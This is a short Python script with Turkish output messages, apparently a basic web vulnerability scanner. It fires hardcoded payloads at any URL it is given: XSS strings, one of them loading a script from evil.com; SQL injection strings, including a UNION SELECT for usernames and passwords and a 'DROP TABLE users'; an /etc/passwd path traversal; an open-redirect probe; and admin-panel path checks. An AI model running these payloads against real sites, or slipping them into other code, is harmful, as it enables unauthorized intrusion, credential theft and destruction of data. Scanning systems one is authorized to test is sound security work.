usage : python han.py http://example.com/



# *--*-**-*-*-*-*-*-*-*-*-*-*-*--*-*-*-*-*-*-**-*-*-*-**-*--*-*-*-*-*--*-*

import sys
import requests

def check_xss(url):
    payloads = [
        "<script>alert(1)</script>",
        "<img src='x' onerror='alert(1)'>",
        "<script>confirm('XSS')</script>",
        "<script>eval('alert(1)')</script>",
        "<svg onload=alert(1)>",
        "<script src=http://evil.com/xss.js></script>",
        "<body onload=alert(1)>",
        "<a href='javascript:alert(1)'>Click me</a>",
        "<iframe src='javascript:alert(1)'></iframe>",
        "<div onmouseover='alert(1)'>Hover over me</div>"
    ]
    
    for payload in payloads:
        test_url = f"{url}?q={payload}"
        try:
            r = requests.get(test_url, timeout=5)
            if payload in r.text:
                print("[+] XSS zafiyeti olabilir:", test_url)
            else:
                print("[-] XSS bulunamadı.")
        except:
            print("Hata oluştu - XSS testi.")

def check_sql_injection(url):
    payloads = [
        "' OR '1'='1",
        "' OR 'a'='a",
        "' OR 1=1 --",
        "' UNION SELECT null, username, password FROM users --",
        "' AND 1=1 --",
        "' OR 'x'='x",
        "admin' --",
        "'; DROP TABLE users; --",
        "' OR '1'='1' /*",
        "';--"
    ]
    
    for payload in payloads:
        test_url = f"{url}?id={payload}"
        try:
            r = requests.get(test_url, timeout=5)
            if "mysql" in r.text.lower() or "syntax" in r.text.lower():
                print("[+] SQL Injection zafiyeti olabilir:", test_url)
            else:
                print("[-] SQL Injection izi yok.")
        except:
            print("Hata oluştu - SQLi testi.")

def check_lfi(url):
    payload = "../../../../../../etc/passwd"
    test_url = f"{url}?file={payload}"
    try:
        r = requests.get(test_url, timeout=5)
        if "root:x:0:0:" in r.text:
            print("[+] LFI zafiyeti olabilir:", test_url)
        else:
            print("[-] LFI bulunamadı.")
    except:
        print("Hata oluştu - LFI testi.")

def check_open_redirect(url):
    payload = "https://evil.com"
    test_url = f"{url}?next={payload}"
    try:
        r = requests.get(test_url, allow_redirects=False, timeout=5)
        if r.status_code in [301, 302] and 'evil.com' in r.headers.get('Location', ''):
            print("[+] Open Redirect zafiyeti olabilir:", test_url)
        else:
            print("[-] Open Redirect izi yok.")
    except:
        print("Hata oluştu - Open Redirect testi.")

def check_admin_panel(url):
    common_paths = ["/admin", "/admin/login", "/admin.php", "/administrator"]
    for path in common_paths:
        test_url = url.rstrip("/") + path
        try:
            r = requests.get(test_url, timeout=5)
            if r.status_code == 200 and "login" in r.text.lower():
                print("[+] Muhtemel admin paneli:", test_url)
        except:
            continue

if __name__ == "__main__":
    print("=== Gelişmiş Güvenlik Açığı Tarayıcısı ===")
    if len(sys.argv) != 2:
        print("Kullanım: python han.py <hedef_url>")
        sys.exit()

    hedef = sys.argv[1]
    check_xss(hedef)
    check_sql_injection(hedef)
    check_lfi(hedef)
    check_open_redirect(hedef)
    check_admin_panel(hedef)
